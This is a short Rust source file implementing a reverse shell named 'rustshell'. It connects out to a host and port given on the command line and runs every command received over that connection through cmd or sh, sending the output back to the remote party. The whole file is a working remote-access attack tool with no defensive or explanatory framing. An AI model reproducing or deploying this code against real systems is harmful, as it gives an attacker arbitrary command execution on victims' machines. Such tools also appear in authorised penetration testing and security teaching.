use std::io::prelude::*;
use std::net::TcpStream;
use std::process::Command;
use std::str::from_utf8;
use std::env;


fn main() -> std::io::Result<()> {
   
    let args: Vec<String> = env::args().collect();
    
    let hostname = &args[1];
    let port = &args[2];
    
    let mut stream = TcpStream::connect(format!("{}:{}", hostname, port))?;
    stream.write(b"Welcome to rustshell.\nI am here to execute your commands\nuse 'exit' to exit\n")?;
    let mut buffer = [0; 2048];

    loop {
        let buf_len = stream.read(&mut buffer).unwrap();
        let command = from_utf8(&buffer[0..buf_len-1]).unwrap();
    
        if command == String::from("exit") {
            break;
        }
        
        let output = if cfg!(target_os = "windows") {
            Command::new("cmd")
                .args(&["/C", &command])
                .output()
                .expect("failed to execute the process")

        } else {
            Command::new("sh")
                .arg("-c")
                .arg(&command)
                .output()
                .expect("failed to execute the process")
            

        };

        let reply = output.stdout;
        stream.write(&reply).unwrap();
    };
        Ok(())
}
